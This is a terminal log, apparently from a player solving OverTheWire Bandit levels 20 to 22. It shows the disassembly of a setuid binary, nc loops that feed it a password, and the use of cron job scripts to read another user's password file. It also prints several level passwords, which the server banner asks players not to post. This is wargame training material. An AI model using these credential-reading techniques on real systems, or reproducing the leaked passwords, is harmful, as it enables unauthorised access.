 8048743:	89 e5                	mov    ebp,esp
 8048745:	83 ec 18             	sub    esp,0x18
 8048748:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804874c:	c7 04 24 64 a0 04 08 	mov    DWORD PTR [esp],0x804a064
 8048753:	ff d2                	call   edx
 8048755:	c9                   	leave
 8048756:	c3                   	ret
 8048757:	89 f6                	mov    esi,esi
 8048759:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

08048760 <__do_global_dtors_aux>:
 8048760:	80 3d 64 a0 04 08 00 	cmp    BYTE PTR ds:0x804a064,0x0
 8048767:	75 13                	jne    804877c <__do_global_dtors_aux+0x1c>
 8048769:	55                   	push   ebp
 804876a:	89 e5                	mov    ebp,esp
 804876c:	83 ec 08             	sub    esp,0x8
 804876f:	e8 7c ff ff ff       	call   80486f0 <deregister_tm_clones>
 8048774:	c6 05 64 a0 04 08 01 	mov    BYTE PTR ds:0x804a064,0x1
 804877b:	c9                   	leave
 804877c:	f3 c3                	repz ret
 804877e:	66 90                	xchg   ax,ax

08048780 <frame_dummy>:
 8048780:	a1 10 9f 04 08       	mov    eax,ds:0x8049f10
 8048785:	85 c0                	test   eax,eax
 8048787:	74 1f                	je     80487a8 <frame_dummy+0x28>
 8048789:	b8 00 00 00 00       	mov    eax,0x0
 804878e:	85 c0                	test   eax,eax
 8048790:	74 16                	je     80487a8 <frame_dummy+0x28>
 8048792:	55                   	push   ebp
 8048793:	89 e5                	mov    ebp,esp
 8048795:	83 ec 18             	sub    esp,0x18
 8048798:	c7 04 24 10 9f 04 08 	mov    DWORD PTR [esp],0x8049f10
 804879f:	ff d0                	call   eax
 80487a1:	c9                   	leave
 80487a2:	e9 79 ff ff ff       	jmp    8048720 <register_tm_clones>
 80487a7:	90                   	nop
 80487a8:	e9 73 ff ff ff       	jmp    8048720 <register_tm_clones>

080487ad <get_password>:
 80487ad:	55                   	push   ebp
 80487ae:	89 e5                	mov    ebp,esp
 80487b0:	83 ec 28             	sub    esp,0x28
 80487b3:	8b 45 10             	mov    eax,DWORD PTR [ebp+0x10]
 80487b6:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80487ba:	c7 44 24 04 00 00 00 	mov    DWORD PTR [esp+0x4],0x0
 80487c1:	00
 80487c2:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80487c5:	89 04 24             	mov    DWORD PTR [esp],eax
 80487c8:	e8 63 fe ff ff       	call   8048630 <memset@plt>
 80487cd:	c7 44 24 04 90 8b 04 	mov    DWORD PTR [esp+0x4],0x8048b90
 80487d4:	08
 80487d5:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 80487d8:	89 04 24             	mov    DWORD PTR [esp],eax
 80487db:	e8 40 fe ff ff       	call   8048620 <fopen@plt>
 80487e0:	89 45 f0             	mov    DWORD PTR [ebp-0x10],eax
 80487e3:	83 7d f0 00          	cmp    DWORD PTR [ebp-0x10],0x0
 80487e7:	75 07                	jne    80487f0 <get_password+0x43>
 80487e9:	b8 00 00 00 00       	mov    eax,0x0
 80487ee:	eb 49                	jmp    8048839 <get_password+0x8c>
 80487f0:	8b 45 f0             	mov    eax,DWORD PTR [ebp-0x10]
 80487f3:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80487f7:	8b 45 10             	mov    eax,DWORD PTR [ebp+0x10]
 80487fa:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80487fe:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048801:	89 04 24             	mov    DWORD PTR [esp],eax
 8048804:	e8 87 fd ff ff       	call   8048590 <fgets@plt>
 8048809:	8b 45 f0             	mov    eax,DWORD PTR [ebp-0x10]
 804880c:	89 04 24             	mov    DWORD PTR [esp],eax
 804880f:	e8 8c fd ff ff       	call   80485a0 <fclose@plt>
 8048814:	c7 44 24 04 0a 00 00 	mov    DWORD PTR [esp+0x4],0xa
 804881b:	00
 804881c:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804881f:	89 04 24             	mov    DWORD PTR [esp],eax
 8048822:	e8 c9 fd ff ff       	call   80485f0 <strchr@plt>
 8048827:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 804882a:	83 7d f4 00          	cmp    DWORD PTR [ebp-0xc],0x0
 804882e:	74 06                	je     8048836 <get_password+0x89>
 8048830:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 8048833:	c6 00 00             	mov    BYTE PTR [eax],0x0
 8048836:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048839:	c9                   	leave
 804883a:	c3                   	ret

0804883b <main>:
 804883b:	55                   	push   ebp
 804883c:	89 e5                	mov    ebp,esp
 804883e:	53                   	push   ebx
 804883f:	83 e4 f0             	and    esp,0xfffffff0
 8048842:	81 ec 70 01 00 00    	sub    esp,0x170
 8048848:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804884b:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 804884f:	65 a1 14 00 00 00    	mov    eax,gs:0x14
 8048855:	89 84 24 6c 01 00 00 	mov    DWORD PTR [esp+0x16c],eax
 804885c:	31 c0                	xor    eax,eax
 804885e:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
 8048862:	7f 2e                	jg     8048892 <main+0x57>
 8048864:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048868:	8b 00                	mov    eax,DWORD PTR [eax]
 804886a:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804886e:	c7 04 24 92 8b 04 08 	mov    DWORD PTR [esp],0x8048b92
 8048875:	e8 f6 fc ff ff       	call   8048570 <printf@plt>
 804887a:	c7 04 24 ac 8b 04 08 	mov    DWORD PTR [esp],0x8048bac
 8048881:	e8 4a fd ff ff       	call   80485d0 <puts@plt>
 8048886:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 804888d:	e8 4e fd ff ff       	call   80485e0 <exit@plt>
 8048892:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048896:	83 c0 04             	add    eax,0x4
 8048899:	8b 00                	mov    eax,DWORD PTR [eax]
 804889b:	89 04 24             	mov    DWORD PTR [esp],eax
 804889e:	e8 9d fd ff ff       	call   8048640 <atoi@plt>
 80488a3:	89 44 24 20          	mov    DWORD PTR [esp+0x20],eax
 80488a7:	83 7c 24 20 00       	cmp    DWORD PTR [esp+0x20],0x0
 80488ac:	78 0a                	js     80488b8 <main+0x7d>
 80488ae:	81 7c 24 20 ff ff 00 	cmp    DWORD PTR [esp+0x20],0xffff
 80488b5:	00
 80488b6:	7e 18                	jle    80488d0 <main+0x95>
 80488b8:	c7 04 24 50 8c 04 08 	mov    DWORD PTR [esp],0x8048c50
 80488bf:	e8 0c fd ff ff       	call   80485d0 <puts@plt>
 80488c4:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80488cb:	e8 10 fd ff ff       	call   80485e0 <exit@plt>
 80488d0:	c7 44 24 08 00 00 00 	mov    DWORD PTR [esp+0x8],0x0
 80488d7:	00
 80488d8:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 80488df:	00
 80488e0:	c7 04 24 02 00 00 00 	mov    DWORD PTR [esp],0x2
 80488e7:	e8 64 fd ff ff       	call   8048650 <socket@plt>
 80488ec:	89 44 24 24          	mov    DWORD PTR [esp+0x24],eax
 80488f0:	83 7c 24 24 00       	cmp    DWORD PTR [esp+0x24],0x0
 80488f5:	79 18                	jns    804890f <main+0xd4>
 80488f7:	c7 04 24 6a 8c 04 08 	mov    DWORD PTR [esp],0x8048c6a
 80488fe:	e8 cd fc ff ff       	call   80485d0 <puts@plt>
 8048903:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 804890a:	e8 d1 fc ff ff       	call   80485e0 <exit@plt>
 804890f:	c7 44 24 04 10 00 00 	mov    DWORD PTR [esp+0x4],0x10
 8048916:	00
 8048917:	8d 44 24 30          	lea    eax,[esp+0x30]
 804891b:	89 04 24             	mov    DWORD PTR [esp],eax
 804891e:	e8 5d fc ff ff       	call   8048580 <bzero@plt>
 8048923:	66 c7 44 24 30 02 00 	mov    WORD PTR [esp+0x30],0x2
 804892a:	8b 44 24 20          	mov    eax,DWORD PTR [esp+0x20]
 804892e:	0f b7 c0             	movzx  eax,ax
 8048931:	89 04 24             	mov    DWORD PTR [esp],eax
 8048934:	e8 87 fc ff ff       	call   80485c0 <htons@plt>
 8048939:	66 89 44 24 32       	mov    WORD PTR [esp+0x32],ax
 804893e:	c7 44 24 08 10 00 00 	mov    DWORD PTR [esp+0x8],0x10
 8048945:	00
 8048946:	8d 44 24 30          	lea    eax,[esp+0x30]
 804894a:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804894e:	8b 44 24 24          	mov    eax,DWORD PTR [esp+0x24]
 8048952:	89 04 24             	mov    DWORD PTR [esp],eax
 8048955:	e8 06 fd ff ff       	call   8048660 <connect@plt>
 804895a:	85 c0                	test   eax,eax
 804895c:	74 18                	je     8048976 <main+0x13b>
 804895e:	c7 04 24 84 8c 04 08 	mov    DWORD PTR [esp],0x8048c84
 8048965:	e8 66 fc ff ff       	call   80485d0 <puts@plt>
 804896a:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048971:	e8 6a fc ff ff       	call   80485e0 <exit@plt>
 8048976:	c7 44 24 0c 00 00 00 	mov    DWORD PTR [esp+0xc],0x0
 804897d:	00
 804897e:	c7 44 24 08 64 00 00 	mov    DWORD PTR [esp+0x8],0x64
 8048985:	00
 8048986:	8d 44 24 40          	lea    eax,[esp+0x40]
 804898a:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804898e:	8b 44 24 24          	mov    eax,DWORD PTR [esp+0x24]
 8048992:	89 04 24             	mov    DWORD PTR [esp],eax
 8048995:	e8 d6 fc ff ff       	call   8048670 <recv@plt>
 804899a:	89 44 24 28          	mov    DWORD PTR [esp+0x28],eax
 804899e:	83 7c 24 28 00       	cmp    DWORD PTR [esp+0x28],0x0
 80489a3:	79 18                	jns    80489bd <main+0x182>
 80489a5:	c7 04 24 99 8c 04 08 	mov    DWORD PTR [esp],0x8048c99
 80489ac:	e8 1f fc ff ff       	call   80485d0 <puts@plt>
 80489b1:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80489b8:	e8 23 fc ff ff       	call   80485e0 <exit@plt>
 80489bd:	8d 54 24 40          	lea    edx,[esp+0x40]
 80489c1:	8b 44 24 28          	mov    eax,DWORD PTR [esp+0x28]
 80489c5:	01 d0                	add    eax,edx
 80489c7:	c6 00 00             	mov    BYTE PTR [eax],0x0
 80489ca:	c7 44 24 04 0a 00 00 	mov    DWORD PTR [esp+0x4],0xa
 80489d1:	00
 80489d2:	8d 44 24 40          	lea    eax,[esp+0x40]
 80489d6:	89 04 24             	mov    DWORD PTR [esp],eax
 80489d9:	e8 12 fc ff ff       	call   80485f0 <strchr@plt>
 80489de:	89 44 24 2c          	mov    DWORD PTR [esp+0x2c],eax
 80489e2:	83 7c 24 2c 00       	cmp    DWORD PTR [esp+0x2c],0x0
 80489e7:	74 07                	je     80489f0 <main+0x1b5>
 80489e9:	8b 44 24 2c          	mov    eax,DWORD PTR [esp+0x2c]
 80489ed:	c6 00 00             	mov    BYTE PTR [eax],0x0
 80489f0:	8d 44 24 40          	lea    eax,[esp+0x40]
 80489f4:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80489f8:	c7 04 24 b7 8c 04 08 	mov    DWORD PTR [esp],0x8048cb7
 80489ff:	e8 6c fb ff ff       	call   8048570 <printf@plt>
 8048a04:	c7 44 24 08 64 00 00 	mov    DWORD PTR [esp+0x8],0x64
 8048a0b:	00
 8048a0c:	8d 84 24 a4 00 00 00 	lea    eax,[esp+0xa4]
 8048a13:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048a17:	c7 04 24 c1 8c 04 08 	mov    DWORD PTR [esp],0x8048cc1
 8048a1e:	e8 8a fd ff ff       	call   80487ad <get_password>
 8048a23:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048a27:	8d 44 24 40          	lea    eax,[esp+0x40]
 8048a2b:	89 04 24             	mov    DWORD PTR [esp],eax
 8048a2e:	e8 2d fb ff ff       	call   8048560 <strcmp@plt>
 8048a33:	85 c0                	test   eax,eax
 8048a35:	75 7b                	jne    8048ab2 <main+0x277>
 8048a37:	c7 04 24 dc 8c 04 08 	mov    DWORD PTR [esp],0x8048cdc
 8048a3e:	e8 8d fb ff ff       	call   80485d0 <puts@plt>
 8048a43:	8d 44 24 40          	lea    eax,[esp+0x40]
 8048a47:	89 04 24             	mov    DWORD PTR [esp],eax
 8048a4a:	e8 b1 fb ff ff       	call   8048600 <strlen@plt>
 8048a4f:	89 c3                	mov    ebx,eax
 8048a51:	c7 44 24 08 64 00 00 	mov    DWORD PTR [esp+0x8],0x64
 8048a58:	00
 8048a59:	8d 84 24 08 01 00 00 	lea    eax,[esp+0x108]
 8048a60:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048a64:	c7 04 24 04 8d 04 08 	mov    DWORD PTR [esp],0x8048d04
 8048a6b:	e8 3d fd ff ff       	call   80487ad <get_password>
 8048a70:	c7 44 24 0c 00 00 00 	mov    DWORD PTR [esp+0xc],0x0
 8048a77:	00
 8048a78:	89 5c 24 08          	mov    DWORD PTR [esp+0x8],ebx
 8048a7c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048a80:	8b 44 24 24          	mov    eax,DWORD PTR [esp+0x24]
 8048a84:	89 04 24             	mov    DWORD PTR [esp],eax
 8048a87:	e8 04 fc ff ff       	call   8048690 <send@plt>
 8048a8c:	c7 44 24 0c 00 00 00 	mov    DWORD PTR [esp+0xc],0x0
 8048a93:	00
 8048a94:	c7 44 24 08 01 00 00 	mov    DWORD PTR [esp+0x8],0x1
 8048a9b:	00
 8048a9c:	c7 44 24 04 1e 8d 04 	mov    DWORD PTR [esp+0x4],0x8048d1e
 8048aa3:	08
 8048aa4:	8b 44 24 24          	mov    eax,DWORD PTR [esp+0x24]
 8048aa8:	89 04 24             	mov    DWORD PTR [esp],eax
 8048aab:	e8 e0 fb ff ff       	call   8048690 <send@plt>
 8048ab0:	eb 30                	jmp    8048ae2 <main+0x2a7>
 8048ab2:	c7 04 24 20 8d 04 08 	mov    DWORD PTR [esp],0x8048d20
 8048ab9:	e8 12 fb ff ff       	call   80485d0 <puts@plt>
 8048abe:	c7 44 24 0c 00 00 00 	mov    DWORD PTR [esp+0xc],0x0
 8048ac5:	00
 8048ac6:	c7 44 24 08 06 00 00 	mov    DWORD PTR [esp+0x8],0x6
 8048acd:	00
 8048ace:	c7 44 24 04 50 8d 04 	mov    DWORD PTR [esp+0x4],0x8048d50
 8048ad5:	08
 8048ad6:	8b 44 24 24          	mov    eax,DWORD PTR [esp+0x24]
 8048ada:	89 04 24             	mov    DWORD PTR [esp],eax
 8048add:	e8 ae fb ff ff       	call   8048690 <send@plt>
 8048ae2:	8b 44 24 24          	mov    eax,DWORD PTR [esp+0x24]
 8048ae6:	89 04 24             	mov    DWORD PTR [esp],eax
 8048ae9:	e8 92 fb ff ff       	call   8048680 <close@plt>
 8048aee:	b8 00 00 00 00       	mov    eax,0x0
 8048af3:	8b 8c 24 6c 01 00 00 	mov    ecx,DWORD PTR [esp+0x16c]
 8048afa:	65 33 0d 14 00 00 00 	xor    ecx,DWORD PTR gs:0x14
 8048b01:	74 05                	je     8048b08 <main+0x2cd>
 8048b03:	e8 a8 fa ff ff       	call   80485b0 <__stack_chk_fail@plt>
 8048b08:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8048b0b:	c9                   	leave
 8048b0c:	c3                   	ret
 8048b0d:	66 90                	xchg   ax,ax
 8048b0f:	90                   	nop

08048b10 <__libc_csu_init>:
 8048b10:	55                   	push   ebp
 8048b11:	57                   	push   edi
 8048b12:	56                   	push   esi
 8048b13:	53                   	push   ebx
 8048b14:	e8 c7 fb ff ff       	call   80486e0 <__x86.get_pc_thunk.bx>
 8048b19:	81 c3 e7 14 00 00    	add    ebx,0x14e7
 8048b1f:	83 ec 0c             	sub    esp,0xc
 8048b22:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 8048b26:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 8048b2c:	e8 f7 f9 ff ff       	call   8048528 <_init>
 8048b31:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 8048b37:	29 c6                	sub    esi,eax
 8048b39:	c1 fe 02             	sar    esi,0x2
 8048b3c:	85 f6                	test   esi,esi
 8048b3e:	74 25                	je     8048b65 <__libc_csu_init+0x55>
 8048b40:	31 ff                	xor    edi,edi
 8048b42:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 8048b48:	83 ec 04             	sub    esp,0x4
 8048b4b:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 8048b4f:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 8048b53:	55                   	push   ebp
 8048b54:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 8048b5b:	83 c7 01             	add    edi,0x1
 8048b5e:	83 c4 10             	add    esp,0x10
 8048b61:	39 f7                	cmp    edi,esi
 8048b63:	75 e3                	jne    8048b48 <__libc_csu_init+0x38>
 8048b65:	83 c4 0c             	add    esp,0xc
 8048b68:	5b                   	pop    ebx
 8048b69:	5e                   	pop    esi
 8048b6a:	5f                   	pop    edi
 8048b6b:	5d                   	pop    ebp
 8048b6c:	c3                   	ret
 8048b6d:	8d 76 00             	lea    esi,[esi+0x0]

08048b70 <__libc_csu_fini>:
 8048b70:	f3 c3                	repz ret

Disassembly of section .fini:

08048b74 <_fini>:
 8048b74:	53                   	push   ebx
 8048b75:	83 ec 08             	sub    esp,0x8
 8048b78:	e8 63 fb ff ff       	call   80486e0 <__x86.get_pc_thunk.bx>
 8048b7d:	81 c3 83 14 00 00    	add    ebx,0x1483
 8048b83:	83 c4 08             	add    esp,0x8
 8048b86:	5b                   	pop    ebx
 8048b87:	c3                   	ret
bandit20@bandit:~$ strings suconnect
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
socket
exit
htons
fopen
connect
puts
__stack_chk_fail
printf
fgets
strlen
send
memset
recv
fclose
bzero
atoi
strchr
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.1
GLIBC_2.0
PTRhp
QVh;
UWVS
t$,U
[^_]
Usage: %s <portnumber>
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
ERROR: Invalid portnumber
ERROR: Can't get a socket
ERROR: Can't connect
ERROR: Can't read from socket
Read: %s
/home/bandit21/.prevpass
Password matches, sending next password
/etc/bandit_pass/bandit21
ERROR: This doesn't match the current password!
FAIL!
;*2$"
GCC: (Ubuntu 4.8.5-4ubuntu2) 4.8.5
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6614
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bandit21.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strcmp@@GLIBC_2.0
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
printf@@GLIBC_2.0
bzero@@GLIBC_2.0
fgets@@GLIBC_2.0
_edata
fclose@@GLIBC_2.1
__stack_chk_fail@@GLIBC_2.4
htons@@GLIBC_2.0
__data_start
puts@@GLIBC_2.0
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
_IO_stdin_used
strchr@@GLIBC_2.0
strlen@@GLIBC_2.0
__libc_start_main@@GLIBC_2.0
__libc_csu_init
fopen@@GLIBC_2.1
memset@@GLIBC_2.0
_fp_hw
__bss_start
main
_Jv_RegisterClasses
get_password
atoi@@GLIBC_2.0
socket@@GLIBC_2.0
__TMC_END__
_ITM_registerTMCloneTable
connect@@GLIBC_2.0
recv@@GLIBC_2.0
close@@GLIBC_2.0
send@@GLIBC_2.0
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
bandit20@bandit:~$ while :
> do
> echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" |nc localhost 23333
> done
bandit20@bandit:~$ nohup "while :; do echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" |nc localhost 23333;  done"&
[1] 26634
bandit20@bandit:/tmp/lambd$ vim ss.sh
bandit20@bandit:/tmp/lambd$ chmod 777 ss.sh
bandit20@bandit:/tmp/lambd$ nohup ./ss.sh &
[1] 26884
bandit20@bandit:/tmp/lambd$ nohup: ignoring input and appending output to 'nohup.out'

bandit20@bandit:/tmp/lambd$ cd
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect 23333
ERROR: Can't connect
bandit20@bandit:~$ nc -lvvp 23333
Listening on [0.0.0.0] (family 0, port 23333)
Connection from [127.0.0.1] port 23333 [tcp/*] accepted (family 2, sport 55764)
#!/bin/bash
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
bandit20@bandit:~$ jobs
[1]+  Running                 nohup ./ss.sh &  (wd: /tmp/lambd)
bandit20@bandit:/tmp/lambd$ nohup ./ss.sh &
[1] 22250
bandit20@bandit:/tmp/lambd$ nohup: ignoring input and appending output to 'nohup.out'

bandit20@bandit:/tmp/lambd$ cd
bandit20@bandit:~$ ./suconnect 23333
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$ cd /tmp/lambd
bandit20@bandit:/tmp/lambd$ ls
nohup.out  ss.sh
bandit20@bandit:/tmp/lambd$ tail -f nohup.out
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
^C
bandit20@bandit:/tmp/lambd$ ssh bandit21@localhost
Could not create directory '/home/bandit20/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit20/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit21@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit21@bandit:~$ ll
total 24
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 ./
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ../
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-r--------  1 bandit21 bandit21   33 Dec 28 14:34 .prevpass
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
bandit21@bandit:/etc/cron.d$ ls -la
total 28
drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
drwxr-xr-x 100 root root 4096 Dec 28 14:34 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest
bandit21@bandit:/etc/cron.d$ cat *
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
4 22 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
cat: /usr/bin/cronjob_bandit23.sh: Permission denied
bandit21@bandit:/etc/cron.d$ ssh bandit22@localhost
Could not create directory '/home/bandit21/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit21/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit22@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

